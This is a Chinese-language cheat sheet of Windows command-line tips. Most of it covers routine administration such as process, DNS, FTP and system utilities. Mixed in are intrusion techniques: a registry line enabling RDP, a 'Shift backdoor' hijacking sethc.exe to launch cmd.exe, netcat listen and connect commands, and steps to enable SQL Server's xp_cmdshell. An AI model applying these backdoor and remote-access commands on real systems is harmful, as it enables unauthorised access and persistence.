### 关闭 端口关联进程
	
    netstat -aon | findstr PORT
    tasklist | findstr PID
    taskkill /f /t /im PNAME

### 查看本地 DNS 缓存

    ipconfig /displaydns

### Window常用系统变量

    %ALLUSERSPROFILE%   列出系统所有用户Profile文件位置
    %APPDATA%   列出系统程序数据默认存放位置
    %CD%    当前目录
    %COMPUTERNAME%   计算机名称
    %HOMEPATH%  列出主用户目录（\Users\Administrator）
    %USERNAME%  用户名
    %OS%    操作系统名称
    %TEMP%   当前用户应用程序的临时目录（C:\Users\ADMINI~1\AppData\Local\Temp）

### 注册表打开 3389 端口

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

### Shift 后门

推荐使用修改注册表方式（镜像劫持）

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v debugger /t REG_SZ /d "%SystemRoot%\system32\cmd.exe"


### NC 命令

    nc 192.168.1.100 5678　　连接.100的5678端口
    nc -vv -lp  22222　　　　监听本地22222端口

### 把两张图片的二进制合成一张图片

copy /b 1.jpg+2.jpg 12.jpg

### CMD下FTP相关操作

    ftp　　启动ftp客户端

    open ftp的ip　　打开ftp站点

    会提示输入用户名 密码

    lcd  本机绝对路径     设置本地文件路径

    get  文件名     下载单个文件

    mget  文件夹名  下载多个文件

    put   本地文件   上传本地文件

### SQLServer2008/2012 开启xp_cmdshell

　　sp_configure 'show advanced options', 1;　　允许配置高级选项
　　RECONFIGURE;
　　sp_configure 'xp_cmdshell', 1;　　启用xp_cmdshell ，值为0表示禁用
　　RECONFIGURE;  

　　--执行想要的xp_cmdshell语句
　　Exec xp_cmdshell 'ipconfig'


### 常用系统命令


    msconfig　　打开系统配置

    mspaint　　打开绘图板

    mstsc　　打开远程桌面

    taskmgr　　任务管理器

    eventver　　事件查看器

    start explorer D:　　打开D盘

    regedit　　打开注册表

    clean mgr　　磁盘清理

    lusrmgr.msc　　查看本地组和用户

    gpedit　　查看组策略

    systeminfo　　显示机器的具体属性和配置信息

    tasklist　　显示当前运行的所有任务和服务

